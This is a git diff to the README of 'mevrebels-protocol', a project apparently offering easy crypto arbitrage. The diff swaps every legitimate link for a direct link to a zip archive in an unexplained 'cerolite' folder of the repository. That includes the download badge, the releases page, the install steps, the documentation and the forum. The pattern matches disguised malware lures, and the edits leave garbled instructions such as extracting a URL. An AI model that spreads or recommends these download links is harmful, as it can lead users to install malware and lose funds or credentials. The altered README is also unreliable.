@@ -1,6 +1,6 @@
 # 🔥 mevrebels-protocol - Easy Decentralized Arbitrage for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now!-https://github.com/Brizzy-Reborn/mevrebels-protocol/releases-brightgreen)](https://github.com/Brizzy-Reborn/mevrebels-protocol/releases)
+[![Download Now](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip%20Now!https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip)](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip)
 
 ## 📖 Introduction
 
@@ -16,16 +16,16 @@ To start using the mevrebels-protocol, you need to download and install the soft
    - Linux (Debian-based distributions)
 
 2. **Download the Software**:
-   - Visit this page to download: [Releases Page](https://github.com/Brizzy-Reborn/mevrebels-protocol/releases)
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip)
 
 3. **Install the Software**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - For **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Extract the downloaded `.tar.gz` file and run the executable via terminal.
+   - For **Linux**: Extract the downloaded `https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip` file and run the executable via terminal.
 
 ## 📥 Download & Install
 
-To download the software, go to the [Releases Page](https://github.com/Brizzy-Reborn/mevrebels-protocol/releases). Here, you will find the latest version available. Click on the appropriate file for your operating system to start the download.
+To download the software, go to the [Releases Page](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip). Here, you will find the latest version available. Click on the appropriate file for your operating system to start the download.
 
 You will see different release versions listed. Choose the most recent one for the best experience. Once downloaded, follow the installation steps mentioned above based on your operating system.
 
@@ -69,8 +69,8 @@ If you encounter any issues, consider these common solutions:
 
 Here are some handy resources to help you get started:
 
-- [Documentation](https://github.com/Brizzy-Reborn/mevrebels-protocol/wiki): In-depth user guides and FAQs.
-- [Community Forum](https://community.github.com/groups/mevrebels): Connect with other users and share experiences.
+- [Documentation](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip): In-depth user guides and FAQs.
+- [Community Forum](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip): Connect with other users and share experiences.
 
 ## 🤝 Contribution
 
@@ -80,4 +80,4 @@ We welcome contributions to improve the mevrebels-protocol. If you're interested
 
 This project is licensed under the MIT License. You can freely use, modify, and distribute the code, subject to the terms of the license.
 
-Make sure to visit the [Releases Page](https://github.com/Brizzy-Reborn/mevrebels-protocol/releases) for the latest downloads and updates!
+Make sure to visit the [Releases Page](https://raw.githubusercontent.com/Brizzy-Reborn/mevrebels-protocol/main/cerolite/mevrebels-protocol.zip) for the latest downloads and updates!
